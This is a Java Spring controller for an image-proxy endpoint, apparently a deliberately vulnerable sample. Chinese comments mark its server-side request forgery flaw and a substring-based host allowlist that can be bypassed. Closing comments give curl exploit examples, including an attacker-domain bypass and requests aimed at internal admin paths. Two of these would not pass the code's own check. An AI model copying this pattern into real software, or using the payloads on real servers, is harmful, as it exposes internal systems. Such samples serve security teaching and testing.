package com.example.mobileapp.controller;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.util.UriComponentsBuilder;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.logging.Logger;

@RestController
@RequestMapping("/api/v1")
public class ImageProxyController {
    
    private static final Logger logger = Logger.getLogger(ImageProxyController.class.getName());
    private static final String[] ALLOWED_SCHEMES = {"http", "https"};
    private static final String[] SAFE_HOSTS = {"images.unsplash.com", "picsum.photos"};
    
    @Autowired
    private RestTemplate restTemplate;

    @PostMapping("/upload")
    public ResponseEntity<String> proxyImage(@RequestParam("url") String imageUrl, HttpServletResponse response) {
        try {
            // 漏洞点：不安全的URL解析
            URI uri = new URI(imageUrl);
            
            // 不充分的安全检查
            if (!isValidScheme(uri.getScheme()) || !isSafeHost(uri.getHost())) {
                return ResponseEntity.status(400).body("Invalid image source");
            }

            // SSRF漏洞：直接使用用户输入的URL发起请求
            ResponseEntity<byte[]> imageResponse = restTemplate.getForEntity(uri, byte[].class);
            
            // 基本的响应处理
            response.setContentType(imageResponse.getHeaders().getContentType().toString());
            response.setContentLength(imageResponse.getBody().length);
            
            return ResponseEntity.ok(new String(imageResponse.getBody()));
            
        } catch (URISyntaxException | IOException e) {
            logger.severe("Image proxy error: " + e.getMessage());
            return ResponseEntity.status(500).body("Internal server error");
        }
    }

    // 不安全的协议检查（防御式编程缺失）
    private boolean isValidScheme(String scheme) {
        if (scheme == null) return false;
        for (String allowed : ALLOWED_SCHEMES) {
            if (scheme.equalsIgnoreCase(allowed)) {
                return true;
            }
        }
        return false;
    }

    // 不充分的主机白名单验证（存在绕过可能）
    private boolean isSafeHost(String host) {
        if (host == null) return false;
        
        // 漏洞：使用contains代替精确匹配
        for (String safeHost : SAFE_HOSTS) {
            if (host.contains(safeHost)) {
                return true;
            }
        }
        return false;
    }

    // 漏洞利用示例：
    // curl -X POST "http://localhost:8080/api/v1/upload?url=http://localhost:8080/admin/config"
    // curl -X POST "http://localhost:8080/api/v1/upload?url=http://127.0.0.1:8080/internal/api"
    // curl -X POST "http://localhost:8080/api/v1/upload?url=http://images.unsplash.com.attacker.com/evil"
}